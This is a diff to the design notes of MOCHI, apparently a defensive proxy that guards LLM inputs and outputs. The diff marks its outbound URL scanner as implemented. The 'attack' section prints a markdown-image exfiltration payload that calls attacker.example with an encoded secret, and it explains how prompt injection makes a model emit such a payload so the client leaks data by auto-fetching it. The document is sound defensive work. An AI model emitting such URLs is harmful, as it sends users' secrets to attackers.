@@ -238,12 +238,54 @@ Note the band rows resolve **without an LLM arbiter** — trust provenance is gr
 
 ## Phase 11 — Outbound Interception
 
-**Goal:** catch what leaks through, and catch exfiltration attempts in the response.
+**Goal:** guard the other direction. Everything before this inspected what goes *to* the model.
 
-- Extend outbound scan: re-run Stage I/II-style detection on the target LLM's *response* text to catch injected instructions that altered output
-- `mitigate/url_scanner.py`: extract all URLs from the response; flag non-allowlisted domains and high-entropy query strings (markdown image/link exfiltration pattern)
+**Status: implemented.** `mochi/mitigate/url_scanner.py` + `outbound.py`, 53 tests, `demo/exfiltration_demo.py` (10/10).
 
-**Definition of done:** a crafted response containing `![x](https://evil.example/log?d=<secret>)` is flagged before returning to the client.
+### The attack
+
+```
+![](https://attacker.example/log?d=c2stbGl2ZS05eDJMbTRRcDhSdA==)
+```
+
+A successful injection makes the model emit this. The client renders it, the renderer **fetches the URL automatically**, and the secret leaves before the user has read a word. No click, no warning — and no inbound check can see it, because the malicious content is in the *output*.
+
+### Two axes, both required
+
+| | carries data | no data |
+|---|---|---|
+| **auto-fetched** (markdown image, `<img>`, `<iframe>`, `data:`) | **HIGH** — remove | none (it's just an image) |
+| **needs a click** (markdown link, bare URL) | **MEDIUM** — remove | none (it's a citation) |
+
+Either signal alone over-fires. Blocking every auto-fetched image breaks legitimate image output; blocking every URL with a query string breaks search links, pagination, and UTM tags. It is the *combination* that has no benign explanation.
+
+### The false-positive problem was the real work
+
+Models return URLs constantly, so a scanner that strips citations breaks the product more often than an attacker exploits it. My first heuristic used raw component length and would have flagged `https://www.theverge.com/2024/01/15/some-long-article-slug` — a readable path, not a payload. The signals are now specific:
+
+| Signal | Threshold | Why |
+|---|---|---|
+| base64 padding (`=`) | 12 chars | strongest single signal, needs least length |
+| hex-only | 24 chars | a UUID is 36 chars and legitimate, so this must not be length alone |
+| mixed upper+lower+digit, no spaces | 24 chars | the encoded-blob signature; prose has spaces, slugs are lowercase |
+| any value | 64 chars | set above a long article title on purpose |
+| unbroken alphanumeric run | 32 chars | not a word, slug, or UUID |
+
+Query *values* are checked individually rather than as one blob, so several short parameters aren't condemned by their combined length. Validated against 12 real URL shapes (dated slugs, UUIDs, UTM tags, deep repo paths) — all pass.
+
+### Disclosure detection is verbatim-only, on purpose
+
+8-word n-grams over case-folded, punctuation-stripped text, so reformatting a quote doesn't evade it. **Only the system prompt is protected** — quoting a retrieved document back is the application working, and treating it as secret would break every RAG and summarisation use case.
+
+Detecting *paraphrased* disclosure would need a semantic model of what each deployment considers secret, which MOCHI does not have. Claiming to detect it would be a promise the code can't keep.
+
+### Streaming
+
+The 501 stays the **default**, but the reason changed. It's no longer "outbound needs the full body" (that's built) — it's that incremental scanning isn't implemented, and an exfiltration URL can straddle two chunks, so chunk-by-chunk scanning would miss the split case.
+
+`MOCHI_ALLOW_BUFFERED_STREAMING=true` serves `stream=true` by buffering, scanning, then emitting one SSE event. It keeps clients working without giving up inspection, and it is **not** incremental delivery — the 501 message says so, so no caller can mistake it. Incremental scanning with a held-back tail window is future work.
+
+**Definition of done:** met — the exact payload from the plan is stripped, and `test_buffered_streaming_still_inspects` proves enabling streaming doesn't open a hole around the scan.
 
 ---
 
